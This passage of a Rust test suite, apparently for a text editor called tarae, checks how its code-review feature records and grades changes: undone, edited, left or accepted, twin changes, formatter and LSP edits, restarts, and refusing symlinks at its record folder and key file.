    let (mut ed, dir) = editor_on("outside", "a.txt", "one\n");
    std::fs::create_dir(dir.join("other")).unwrap();
    let env = dir.join("other").join(".env");
    std::fs::write(&env, "PASS=\n").unwrap();
    ed.session.root = dir.join("proj");
    ed.open(&env).unwrap();
    let id = ed.doc().id;
    crate::llm::review_with(&mut ed, id, "set it", vec![(0, 6, "PASS=\n".into(), "PASS=abc\n".into())], None);
    frame(&mut ed);
    feed(&mut ed, "a");
    let (entries, raw) = record(&dir.join(DIR));
    let changes = changes_in(&entries);
    assert_eq!(changes.len(), 1, "{raw}");
    assert!(changes[0].get("change").is_none(), "a key-named file's change has no id: {raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// A link where the record's folder goes is refused, never followed: nothing is written where it points, no
/// key made, and the months aren't pruned through it.
#[test]
fn a_link_at_the_records_folder_is_refused() {
    let (mut ed, dir) = editor_on("link", "a.txt", "one\n");
    let elsewhere = dir.join("elsewhere");
    std::fs::create_dir(&elsewhere).unwrap();
    std::os::unix::fs::symlink(&elsewhere, dir.join(DIR)).unwrap();
    let id = ed.doc().id;
    crate::llm::review_with(&mut ed, id, "upper", vec![(0, 4, "one\n".into(), "ONE\n".into())], None);
    frame(&mut ed);
    feed(&mut ed, "a");
    assert!(crate::cards::wait_written(Duration::from_secs(5)), "the record's writes ended");
    let there: Vec<_> = std::fs::read_dir(&elsewhere).unwrap().flatten().map(|e| e.file_name()).collect();
    assert!(there.is_empty(), "written through the link: {there:?}");
    assert!(!key_path(&dir.join(DIR)).exists(), "no key made");
    assert!(no_link(&dir.join(DIR)).is_err(), "pruning refuses it too");
    std::fs::remove_dir_all(&dir).ok();
}

/// A change rewritten by no key of yours — a formatter's or a reload's edit — isn't `edited`; one you typed
/// into is.
#[test]
fn a_change_you_didnt_type_isnt_edited() {
    let (mut ed, dir) = reviewing("untyped", &["a.txt", "b.txt"], &[]);
    let tx = crate::transaction::Transaction::new(vec![crate::transaction::Change {
        from: 0,
        to: 1,
        insert: "A".into(),
    }]);
    ed.doc_mut().apply(&tx);
    rediffed(&mut ed, "a.txt's diff after the job's edit");
    show(&mut ed, &dir, 1, "b.txt");
    feed(&mut ed, "iX<esc>");
    rediffed(&mut ed, "b.txt's diff after your edit");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let change = |f: &str| *changes_in(&entries).iter().find(|e| e["file"] == f).expect(f);
    assert_eq!(
        (change("a.txt")["outcome"].as_str(), change("a.txt").get("edited")),
        (Some("left"), None),
        "not yours: {raw}"
    );
    assert_eq!(change("b.txt")["outcome"], "edited", "yours: {raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// A file made executable is a change of its own, high by that rule, with no id (no text): alone in its file,
/// or beside a change of lines elsewhere in it — which keeps its own grade. The review's `total` counts them as
/// the record does.
#[test]
fn a_change_of_mode_is_a_change_of_its_own() {
    use std::os::unix::fs::PermissionsExt as _;
    let files = [
        ("a.sh", "echo a\n", "echo a\n"),
        ("b.sh", "one\ntwo\nthree\n", "one\ntwo\nTHREE\n"),
        ("c.sh", "echo one\n", "echo ONE\n"),
    ];
    let (mut ed, dir) = repo("mode", &files, &[]);
    for f in ["a.sh", "b.sh", "c.sh"] {
        std::fs::set_permissions(dir.join(f), std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    open_review(&mut ed, &dir, &files);
    for (i, f) in ["a.sh", "b.sh", "c.sh"].into_iter().enumerate() {
        show(&mut ed, &dir, i, f);
    }
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let mut lines: Vec<(&str, Option<&str>, Option<&str>, bool)> = changes_in(&entries)
        .iter()
        .map(|c| {
            (c["file"].as_str().unwrap(), c["grade"].as_str(), c["rule"].as_str(), c.get("change").is_some())
        })
        .collect();
    crate::sorting::sort(&mut lines);
    let exec = (Some("high"), Some("now executable"), false);
    assert_eq!(
        lines,
        [
            ("a.sh", exec.0, exec.1, exec.2),
            ("b.sh", Some("behaviour"), None, true),
            ("b.sh", exec.0, exec.1, exec.2),
            ("c.sh", Some("behaviour"), None, true),
            ("c.sh", exec.0, exec.1, exec.2)
        ],
        "{raw}"
    );
    let review = entries.iter().find(|e| e["entry"] == "review").expect("its line");
    assert_eq!(review["total"].as_u64(), Some(5), "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// The id of the `nth` change of `file` with these lines, as the record in `dir` keeps it.
fn kept_id(dir: &Path, file: &str, removed: &[&str], added: &[&str], nth: usize) -> String {
    let text = text_id(file, removed.iter().copied(), added.iter().copied());
    keyed(&record_key(dir), &change_id(&text, nth))
}

/// Of two alike changes, the first taken back with `space v u` is the one `undone` — though the second, a
/// block of six lines down, now starts nearer where the first was.
#[test]
fn alike_changes_keep_their_places_when_one_is_taken_back() {
    let block = "1\n2\n3\n4\n5\n6\n";
    let now = format!("a\n{block}b\nc\nd\n{block}e\n");
    let (mut ed, dir) = reviewing_texts("shift", &[("x.txt", "a\ny\nb\nc\nd\ny\ne\n", &now)], &[]);
    assert_eq!(ed.cursor_line(), 1, "in the first");
    feed(&mut ed, "<space>vu");
    rediffed(&mut ed, "the diff after the undo");
    assert_eq!(ed.doc().text.to_string(), format!("a\ny\nb\nc\nd\n{block}e\n"), "the first taken back");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let id = |nth| kept_id(&dir.join("state"), "x.txt", &["y"], &["1", "2", "3", "4", "5", "6"], nth);
    let outcome = |id: String| {
        changes_in(&entries).iter().find(|e| e["change"] == id.as_str()).map(|e| e["outcome"].clone())
    };
    assert_eq!(outcome(id(0)), Some(json!("undone")), "the first: {raw}");
    assert_eq!(outcome(id(1)), Some(json!("left")), "the second: {raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// A change taken back while its twin is off screen: the one taken back is `undone`, never taken for the twin
/// — every change of a file in sight is followed, drawn or not (the record keeps those seen).
#[test]
fn an_alike_change_off_screen_is_never_taken_for_the_one_taken_back() {
    let line = |l: usize, twin: &str| if l == 1 || l == 90 { twin.to_string() } else { format!("l{l}") };
    let then: String = (0..100).map(|l| line(l, "y") + "\n").collect();
    let now: String = (0..100).map(|l| line(l, "x") + "\n").collect();
    let (mut ed, dir) = reviewing_texts("twin", &[("t.txt", &then, &now)], &[]);
    assert_eq!(ed.cursor_line(), 1, "in the first");
    let w = ed.session.reviews.code.as_ref().expect("its watch");
    assert_eq!((w.changes.len(), w.kept().count()), (2, 1), "both followed, the twin off screen");
    feed(&mut ed, "<space>vu");
    rediffed(&mut ed, "the diff after the undo");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let changes = changes_in(&entries);
    assert_eq!(changes.len(), 1, "the one seen: {raw}");
    let first = kept_id(&dir.join("state"), "t.txt", &["y"], &["x"], 0);
    assert_eq!((&changes[0]["change"], &changes[0]["outcome"]), (&json!(first), &json!("undone")), "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// `space v u` then `u`: the change is back, and it's one change — its entry taken again, not `undone`.
#[test]
fn a_change_taken_back_and_brought_back_is_one_change() {
    let (mut ed, dir) = reviewing("back", &["a.txt"], &[]);
    feed(&mut ed, "<space>vu");
    rediffed(&mut ed, "the diff after the undo");
    feed(&mut ed, "u");
    rediffed(&mut ed, "the diff after the undo's undo");
    assert_eq!(ed.doc().text.to_string(), "a.txt ONE\n", "back");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let outcomes: Vec<&Value> = changes_in(&entries).iter().map(|e| &e["outcome"]).collect();
    assert_eq!(outcomes, ["left"], "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// A file of the review closed and opened again (another buffer) has the same changes, not new ones.
#[test]
fn a_file_opened_again_has_the_same_changes() {
    let (mut ed, dir) = reviewing("reopen", &["a.txt", "b.txt"], &[]);
    let first = ed.doc().id;
    show(&mut ed, &dir, 1, "b.txt");
    ed.close_doc(first);
    show(&mut ed, &dir, 0, "a.txt");
    assert_ne!(ed.doc().id, first, "another buffer");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    assert_eq!(changes_in(&entries).iter().filter(|e| e["file"] == "a.txt").count(), 1, "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// A review of high-risk `c.txt` in a session of its own, its change taken back with `space v u` before its
/// diff is read again.
fn undone_in_a_session(name: &str) -> (Editor, PathBuf) {
    let files = [("c.txt", "c one\n", "c ONE\n")];
    let (mut ed, dir) = repo(name, &files, &["c.txt"]);
    let other = ed.session_add(dir.clone());
    ed.session_switch(other);
    open_review(&mut ed, &dir, &files);
    feed(&mut ed, "<space>vu");
    (ed, dir)
}

/// The record's line of `c.txt`'s change taken back: `undone`, high by its rule.
fn assert_undone_graded(dir: &Path) {
    let (entries, raw) = record(&dir.join("state"));
    let changes = changes_in(&entries);
    assert_eq!(changes.len(), 1, "{raw}");
    let c = changes[0];
    assert_eq!(
        (c["outcome"].as_str(), c["grade"].as_str(), c["rule"].as_str()),
        (Some("undone"), Some("high"), Some("c.txt (.tarae.toml)")),
        "{raw}"
    );
}

/// A session ended (`space W d`, a bring's end) keeps its review as quitting would: graded, each change as
/// it ended.
#[test]
fn a_session_ending_keeps_its_review_graded() {
    let (mut ed, dir) = undone_in_a_session("ending");
    ed.session_close(&dir).expect("it ends");
    assert_undone_graded(&dir);
    std::fs::remove_dir_all(&dir).ok();
}

/// Quitting with a session behind keeps its review graded too, as the one in front.
#[test]
fn quitting_keeps_a_review_behind_graded() {
    let (mut ed, dir) = undone_in_a_session("behind-quit");
    ed.session_switch(0);
    frame(&mut ed);
    ed.reviews_flush();
    assert_undone_graded(&dir);
    std::fs::remove_dir_all(&dir).ok();
}

/// A change taken back keeps the grade and rule it had when last seen — gone, nothing graded is on its lines
/// — and is `undone` though the review ends before its diff is read again.
#[test]
fn a_change_taken_back_keeps_its_grade_and_rule() {
    let (mut ed, dir) = reviewing("undo-grade", &["c.txt", "d.txt"], &["c.txt", "d.txt"]);
    assert_eq!(ed.doc().path.as_deref(), Some(dir.join("c.txt").as_path()));
    feed(&mut ed, "<space>vu");
    rediffed(&mut ed, "c.txt's diff after the undo");
    show(&mut ed, &dir, 1, "d.txt");
    feed(&mut ed, "<space>vu");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    for f in ["c.txt", "d.txt"] {
        let c = changes_in(&entries).into_iter().find(|e| e["file"] == f).expect(f);
        let rule = format!("{f} (.tarae.toml)");
        assert_eq!(
            (c["outcome"].as_str(), c["grade"].as_str(), c["rule"].as_str()),
            (Some("undone"), Some("high"), Some(rule.as_str())),
            "{f}: {raw}"
        );
    }
    std::fs::remove_dir_all(&dir).ok();
}

/// The outcome of the change with these lines in `entries` (the `nth` alike), as the record in `dir` keys it.
fn outcome_of(
    entries: &[Value],
    dir: &Path,
    file: &str,
    (removed, added): (&[&str], &[&str]),
    nth: usize,
) -> Value {
    let id = kept_id(dir, file, removed, added, nth);
    changes_in(entries)
        .iter()
        .find(|e| e["change"] == id.as_str())
        .map_or(Value::Null, |e| e["outcome"].clone())
}

/// A deletion taken back with `space v u` from where the reset finds it — the line above its gap — is the one
/// `undone`, graded.
#[test]
fn a_deletion_taken_back_is_undone() {
    let (mut ed, dir) = reviewing_texts("deletion", &[("d.txt", "a\nb\nc\n", "a\nc\n")], &[]);
    feed(&mut ed, "gg");
    frame(&mut ed);
    feed(&mut ed, "<space>vu");
    rediffed(&mut ed, "the diff after the undo");
    assert_eq!(ed.doc().text.to_string(), "a\nb\nc\n", "taken back");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let changes = changes_in(&entries);
    assert_eq!(changes.len(), 1, "{raw}");
    assert_eq!(changes[0]["outcome"], "undone", "{raw}");
    assert!(changes[0]["grade"].is_string(), "graded as last seen: {raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// Of two alike deletions, the one the reset takes back (the cursor on the line above the second's gap, which is
/// in the first's) is the one `undone`.
#[test]
fn of_twin_deletions_the_one_taken_back_is_undone() {
    let (mut ed, dir) = reviewing_texts("twins", &[("t.txt", "a\nx\nb\nx\nc\n", "a\nb\nc\n")], &[]);
    feed(&mut ed, "ggj");
    frame(&mut ed);
    assert_eq!(ed.cursor_line(), 1);
    feed(&mut ed, "<space>vu");
    rediffed(&mut ed, "the diff after the undo");
    assert_eq!(ed.doc().text.to_string(), "a\nb\nx\nc\n", "the second taken back");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let state = dir.join("state");
    assert_eq!(outcome_of(&entries, &state, "t.txt", (&["x"], &[]), 1), json!("undone"), "the second: {raw}");
    assert_eq!(outcome_of(&entries, &state, "t.txt", (&["x"], &[]), 0), json!("left"), "the first: {raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// Keys in one batch — no frame between a move and `space v u`, as a macro or a driver sends them: the change
/// taken back is the one the cursor is on as the key runs, not the one the last frame had in hand.
#[test]
fn keys_in_one_batch_take_back_the_change_the_cursor_is_on() {
    let (mut ed, dir) =
        reviewing_texts("batch", &[("b.txt", "a\nb\nc\nd\ne\nf\n", "A\nb\nc\nd\nE\nf\n")], &[]);
    feed(&mut ed, "gg");
    frame(&mut ed);
    feed(&mut ed, "jjjj<space>vu");
    rediffed(&mut ed, "the diff after the undo");
    assert_eq!(ed.doc().text.to_string(), "A\nb\nc\nd\ne\nf\n", "the second taken back");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let state = dir.join("state");
    assert_eq!(outcome_of(&entries, &state, "b.txt", (&["e"], &["E"]), 0), json!("undone"), "{raw}");
    assert_eq!(outcome_of(&entries, &state, "b.txt", (&["a"], &["A"]), 0), json!("left"), "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// A high-risk change you delete by hand keeps the grade and rule it was last seen with — nothing graded is on
/// its old lines now.
#[test]
fn a_change_gone_by_hand_keeps_its_grade_and_rule() {
    let (mut ed, dir) = reviewing_texts("by-hand", &[("c.txt", "a\n", "a\nadded\n")], &["c.txt"]);
    assert_eq!(ed.cursor_line(), 1, "on the change");
    feed(&mut ed, "xd");
    rediffed(&mut ed, "the diff after the delete");
    assert_eq!(ed.doc().text.to_string(), "a\n", "gone");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let changes = changes_in(&entries);
    assert_eq!(changes.len(), 1, "{raw}");
    let c = changes[0];
    assert_eq!(
        (c["grade"].as_str(), c["rule"].as_str()),
        (Some("high"), Some("c.txt (.tarae.toml)")),
        "{raw}"
    );
    assert_eq!(c["outcome"], "edited", "taken out by your own keys: {raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// `edited` is a change's own: your keys on one change, and an edit not yours (a formatter's, a job's) rewriting
/// another in the same file since — the first `edited`, the other not.
#[test]
fn a_rewrite_not_yours_beside_your_typing_isnt_edited() {
    let (mut ed, dir) = reviewing_texts("beside", &[("b.txt", "a\nk\nb\n", "A\nk\nB\n")], &[]);
    feed(&mut ed, "ggiX<esc>");
    // (format-on-save's edit, landing as a job's: no key of yours)
    let at = ed.doc().text.line_to_byte(2);
    let tx = crate::transaction::Transaction::new(vec![crate::transaction::Change::insert(at, "Y")]);
    ed.doc_mut().apply(&tx);
    rediffed(&mut ed, "the diff after both");
    assert_eq!(ed.doc().text.to_string(), "XA\nk\nYB\n");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let state = dir.join("state");
    assert_eq!(outcome_of(&entries, &state, "b.txt", (&["a"], &["A"]), 0), json!("edited"), "yours: {raw}");
    assert_eq!(outcome_of(&entries, &state, "b.txt", (&["b"], &["B"]), 0), json!("left"), "not yours: {raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// An edit not yours, then your keys elsewhere in the file: only what the keys changed is yours.
#[test]
fn a_rewrite_not_yours_after_your_typing() {
    let (mut ed, dir) = reviewing_texts("after", &[("b.txt", "a\nk\nb\n", "A\nk\nB\n")], &[]);
    let at = ed.doc().text.line_to_byte(2);
    let tx = crate::transaction::Transaction::new(vec![crate::transaction::Change::insert(at, "Y")]);
    ed.doc_mut().apply(&tx);
    feed(&mut ed, "ggiX<esc>");
    rediffed(&mut ed, "the diff after both");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let state = dir.join("state");
    assert_eq!(outcome_of(&entries, &state, "b.txt", (&["a"], &["A"]), 0), json!("edited"), "yours: {raw}");
    assert_eq!(outcome_of(&entries, &state, "b.txt", (&["b"], &["B"]), 0), json!("left"), "not yours: {raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// `f` as one key's work, as `Editor::handle_key` wraps it: what it edits is yours, but what says it isn't.
fn as_a_key(ed: &mut Editor, f: impl FnOnce(&mut Editor)) {
    assert!(crate::document::input_begin(), "no key under way");
    f(ed);
    for id in crate::document::input_end() {
        if let Some(d) = ed.docs.iter_mut().find(|d| d.id == id) {
            d.own.input_end();
        }
    }
}

/// LSP text edits putting `text` at the start of line `line`.
fn insert_at(line: usize, text: &str) -> Vec<Value> {
    let at = json!({ "line": line, "character": 0 });
    vec![json!({ "range": { "start": at, "end": at }, "newText": text })]
}

/// Edits a key of yours asks for but doesn't make — a server's (rename, a code action, format), format-on-save's,
/// a checkpoint's step (`space u`) — rewrite a change without making it `edited`; `space /`'s replace is yours.
#[test]
fn edits_on_a_key_not_yours_arent_edited() {
    use crate::lsp::Encoding::Utf8;
    type Edit = fn(&mut Editor, &Path);
    let server: Edit = |ed, _| ed.apply_text_edits(ed.doc().id, Utf8, &insert_at(2, "S")).unwrap();
    let format: Edit = |ed, _| {
        // (format-on-save touches only lines changed since the save: one not yours, a job's)
        // (kept in the undo history with the saved text before it, as an edit is: format-on-save reads it there)
        let (at, before) = (ed.doc().text.line_to_byte(2), ed.doc().snapshot());
        ed.doc_mut()
            .apply(&crate::transaction::Transaction::new(vec![crate::transaction::Change::insert(at, "J")]));
        ed.doc_mut().commit_undo(before);
        as_a_key(ed, |ed| ed.apply_format_on_save(ed.doc().id, Utf8, &insert_at(2, "F")).unwrap());
    };
    let step: Edit = |ed, path| {
        let now = ed.doc().text.clone();
        let to = ropey::Rope::from_str(&now.to_string().replace("B\n", "C\n"));
        crate::checkpoint::file(ed, path, Some(&now), Some(&to)).unwrap();
    };
    let replace: Edit = |ed, path| {
        let (base, diff) = (ed.doc().text.clone(), std::sync::Arc::new(Vec::new()));
        let edits = insert_at(2, "R");
        ed.replace_plan =
            vec![crate::replace::FilePlan { path: path.to_path_buf(), base, edits, diff, count: 1 }];
        ed.replace_apply(&[0]);
    };
    let cases = [
        ("server", server, "left"),
        ("format", format, "left"),
        ("step", step, "left"),
        ("replace", replace, "edited"),
    ];
    for (name, edit, outcome) in cases {
        let (mut ed, dir) = reviewing_texts(name, &[("b.txt", "a\nk\nb\n", "A\nk\nB\n")], &[]);
        let path = dir.join("b.txt");
        match name {
            "format" => edit(&mut ed, &path),
            _ => as_a_key(&mut ed, |ed| edit(ed, &path)),
        }
        rediffed(&mut ed, name);
        assert_ne!(ed.doc().text.to_string(), "A\nk\nB\n", "{name}: rewritten");
        crate::codereview::close(&mut ed);
        let (entries, raw) = record(&dir.join("state"));
        let state = dir.join("state");
        assert_eq!(
            outcome_of(&entries, &state, "b.txt", (&["b"], &["B"]), 0),
            json!(outcome),
            "{name}: {raw}"
        );
        std::fs::remove_dir_all(&dir).ok();
    }
}

/// An edit of nothing that isn't yours, after yours in the same key, drops nothing of yours.
#[test]
fn an_empty_edit_not_yours_keeps_yours() {
    let (mut ed, dir) = reviewing_texts("empty", &[("e.txt", "a\nk\nb\n", "A\nk\nB\n")], &[]);
    as_a_key(&mut ed, |ed| {
        feed(ed, "ggiX<esc>");
        ed.apply_text_edits(ed.doc().id, crate::lsp::Encoding::Utf8, &[]).unwrap();
    });
    rediffed(&mut ed, "the diff after it");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let state = dir.join("state");
    assert_eq!(outcome_of(&entries, &state, "e.txt", (&["a"], &["A"]), 0), json!("edited"), "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// An edit review's `y` on a buffer gone before it lands: nothing applied, so `left`, not `accepted`.
#[test]
fn an_accept_that_lands_nowhere_is_left() {
    let (mut ed, dir) = editor_on("gone", "a.txt", "one\n");
    let id = ed.doc().id;
    crate::llm::review_with(&mut ed, id, "upper", vec![(0, 4, "one\n".into(), "ONE\n".into())], None);
    frame(&mut ed);
    std::fs::write(dir.join("b.txt"), "b\n").unwrap();
    ed.open(&dir.join("b.txt")).unwrap();
    ed.docs.retain(|d| d.id != id);
    ed.current = 0;
    feed(&mut ed, "y");
    frame(&mut ed);
    let (entries, raw) = record(&dir.join(DIR));
    assert_eq!(changes_in(&entries).first().map(|e| e["outcome"].clone()), Some(json!("left")), "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// The git tab's `d` and the palette's "Undo this change" take a change back as `space v u` does: `undone`.
#[test]
fn a_change_reset_another_way_is_undone() {
    let (mut ed, dir) = reviewing_texts("reset", &[("r.txt", "a\nb\n", "A\nb\n")], &[]);
    feed(&mut ed, "gg");
    ed.git_reset_hunk();
    rediffed(&mut ed, "the diff after the reset");
    assert_eq!(ed.doc().text.to_string(), "a\nb\n", "taken back");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    assert_eq!(changes_in(&entries)[0]["outcome"], "undone", "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// A worker's finding of a text gone since — asked before a take-back, landing after it — is never applied:
/// the change taken back stays asked back, and is `undone`.
#[test]
fn a_finding_of_a_text_gone_is_never_applied() {
    let (mut ed, dir) = reviewing_texts("stale", &[("s.txt", "a\nb\n", "A\nb\n")], &[]);
    let (of, at, file, stale) = {
        let (r, w, d) =
            (ed.session.code_review.as_ref().unwrap(), ed.session.reviews.code.as_ref().unwrap(), ed.doc());
        let f = &r.files[0];
        let stale = found_of(&Text::of(d), (&f.rel, &f.path, &r.root), &r.rules);
        (w.of, (d.id, d.version(), d.git_version), f.rel.clone(), stale)
    };
    feed(&mut ed, "gg<space>vu");
    landed(&mut ed, of, file, at, stale);
    rediffed(&mut ed, "the diff after the undo");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    assert_eq!(changes_in(&entries)[0]["outcome"], "undone", "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// Keys in one batch that change the text before a take-back (a macro: `rzjj<space>vu`): nothing is
/// hashed on the key, and the change taken back is the one the cursor is on — its place as found, moved with
/// the edits since — never its twin, though the twin's text no longer is what was found (N17).
#[test]
fn a_take_back_after_edits_in_one_batch_hashes_nothing_and_takes_the_right_one() {
    let (mut ed, dir) = reviewing_texts("macro", &[("m.txt", "a\ny\nb\ny\nc\n", "a\nx\nb\nx\nc\n")], &[]);
    feed(&mut ed, "ggjrzjj<space>vu");
    assert_eq!(FOUND_HERE.with(|n| n.get()), 0, "hashed on the key");
    rediffed(&mut ed, "the diff after the undo");
    assert_eq!(ed.doc().text.to_string(), "a\nz\nb\ny\nc\n", "the second taken back");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let state = dir.join("state");
    assert_eq!(outcome_of(&entries, &state, "m.txt", (&["y"], &["x"]), 1), json!("undone"), "{raw}");
    assert_eq!(outcome_of(&entries, &state, "m.txt", (&["y"], &["x"]), 0), json!("edited"), "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// Past `ALIGN_MAX` alike changes in a file, its changes stop being paired — said so on each line — rather than
/// paired in order alone, which took one taken back and brought back (`u`) for its neighbour and gave two
/// changes one id.
#[test]
fn past_the_cap_a_files_changes_are_unpaired_not_paired_wrong() {
    let (then, now): (String, String) =
        ((0..300).map(|_| "x\nk\n").collect(), (0..300).map(|_| "y\nk\n").collect());
    let (mut ed, dir) = reviewing_texts("cap", &[("c.txt", &then, &now)], &[]);
    feed(&mut ed, "gg<space>vu");
    rediffed(&mut ed, "the diff after the undo");
    feed(&mut ed, "u");
    rediffed(&mut ed, "the diff after it's back");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let changes = changes_in(&entries);
    assert!(!changes.is_empty(), "{raw}");
    assert!(changes.iter().all(|c| c["unpaired"] == "too many alike changes"), "{raw}");
    let ids: HashSet<&str> = changes.iter().filter_map(|c| c["change"].as_str()).collect();
    assert_eq!(ids.len(), changes.len(), "one id each: {raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// `:reload` is your key, not your edit: a change the file on disk rewrote isn't `edited`.
#[test]
fn a_reload_isnt_your_edit() {
    let (mut ed, dir) = reviewing("reload", &["a.txt"], &[]);
    std::fs::write(dir.join("a.txt"), "A.txt ONE\n").unwrap();
    feed(&mut ed, ":reload<ret>");
    rediffed(&mut ed, "the diff after the reload");
    assert_eq!(ed.doc().text.to_string(), "A.txt ONE\n", "reloaded");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let c = changes_in(&entries)[0];
    assert_eq!((c["outcome"].as_str(), c.get("edited")), (Some("left"), None), "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// Claude's accepted edit isn't yours, though you typed elsewhere in the file since its changes were last found:
/// the change it rewrote isn't `edited`.
#[test]
fn an_accepted_edit_isnt_yours_though_you_typed_since() {
    let files = [("a.txt", "one\ntwo\nthree\nfour\n", "ONE\ntwo\nthree\nfour\n")];
    let (mut ed, dir) = reviewing_texts("accepted", &files, &[]);
    // (you type on another line, no frame since; then Claude's edit of the change, accepted)
    feed(&mut ed, "ggjjjiZ<esc>");
    let id = ed.doc().id;
    crate::llm::review_with(&mut ed, id, "spanish", vec![(0, 4, "ONE\n".into(), "UNO\n".into())], None);
    frame(&mut ed);
    feed(&mut ed, "a");
    rediffed(&mut ed, "the diff after the edit");
    assert_eq!(ed.doc().text.to_string(), "UNO\ntwo\nthree\nZfour\n");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let first = state_id_line(&entries, &dir, &["one"], &["ONE"]);
    assert_eq!((first["outcome"].as_str(), first.get("edited")), (Some("left"), None), "Claude's: {raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// The code review's line in `entries` of the change of a.txt first seen with these lines.
fn state_id_line(entries: &[Value], dir: &Path, removed: &[&str], added: &[&str]) -> Value {
    let id = kept_id(&dir.join("state"), "a.txt", removed, added, 0);
    let line = changes_in(entries).into_iter().find(|e| e["kind"] != "edit" && e["change"] == id.as_str());
    line.cloned().unwrap_or_else(|| panic!("no line of it: {entries:?}"))
}

/// `:restart` ends the reviews under way as the loop ends (`reviews_flush` with the restart gone ahead): each
/// recorded once, graded, said `restarted` — and nothing of it goes into the restart's state (no change's hash,
/// no id), so the review it opens again (`restart::restore`) is a new one.
#[test]
fn a_restart_ends_the_review_under_way_and_the_one_back_is_new() {
    let files = [("a.txt", "a.txt one\n", "a.txt ONE\n")];
    let (mut ed, dir) = reviewing_texts("restart", &files, &[]);
    let id = ed.session.reviews.code.as_ref().expect("its watch").id.clone();
    ed.restart = Some(crate::restart::Restart::ready_to(dir.join("tarae")));
    ed.reviews_flush();
    let state = crate::restart::snapshot(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let reviews: Vec<&Value> = entries.iter().filter(|e| e["entry"] == "review").collect();
    assert_eq!(reviews.len(), 1, "{raw}");
    assert_eq!((reviews[0]["review"].as_str(), &reviews[0]["restarted"]), (Some(id.as_str()), &json!(true)));
    assert_eq!(reviews[0]["total"], 1, "graded as it ended: {raw}");
    let said = state.to_string();
    let text = text_id("a.txt", ["a.txt one"], ["a.txt ONE"]);
    assert!(!said.contains(&id) && !said.contains(&text), "nothing of the review in the state: {said}");
    // (the new tarae: its review opens again, a new one)
    let mut ed = Editor::new(crate::config::Config::default());
    ed.reviews_dir = Some(dir.join("state"));
    crate::restart::restore(&mut ed, &state);
    settle_until(&mut ed, "the review back", |ed| landed_on(ed, &dir.join("a.txt")));
    frame(&mut ed);
    let back = ed.session.reviews.code.as_ref().expect("a watch").id.clone();
    assert_ne!(back, id, "a new review");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let reviews: Vec<&Value> = entries.iter().filter(|e| e["entry"] == "review").collect();
    assert_eq!(reviews.len(), 2, "{raw}");
    assert!(reviews[1].get("restarted").is_none(), "the new one ended as usual: {raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// A link at the record's key is refused, never read: no line keyed under what it points at.
#[test]
fn a_link_at_the_key_is_refused() {
    let (mut ed, dir) = editor_on("key-link", "a.txt", "one\n");
    let known = dir.join("known");
    std::fs::write(&known, [7u8; 32]).unwrap();
    std::os::unix::fs::symlink(&known, key_path(&dir.join(DIR))).unwrap();
    let id = ed.doc().id;
    crate::llm::review_with(&mut ed, id, "upper", vec![(0, 4, "one\n".into(), "ONE\n".into())], None);
    frame(&mut ed);
    feed(&mut ed, "a");
    let (entries, raw) = record(&dir.join(DIR));
    assert!(entries.is_empty(), "keyed through the link: {raw}");
    assert_eq!(std::fs::read(&known).unwrap(), [7u8; 32], "what it points at untouched");
    std::fs::remove_dir_all(&dir).ok();
}

/// Taraes (or workers) making the key at once end up on one key: the first made, read whole by the others —
/// one that found none and makes it second gets the first's, and the first's stays.
#[test]
fn first_writes_at_once_share_one_key() {
    let dir = crate::scratch::Scratch::new("reviews-key-race").into_path();
    let rec = dir.join(DIR);
    let lone = dir.join("lone.key");
    assert_eq!(made_key(&lone, [1; 32]).unwrap(), [1; 32], "the first");
    assert_eq!(made_key(&lone, [2; 32]).unwrap(), [1; 32], "the second gets the first's");
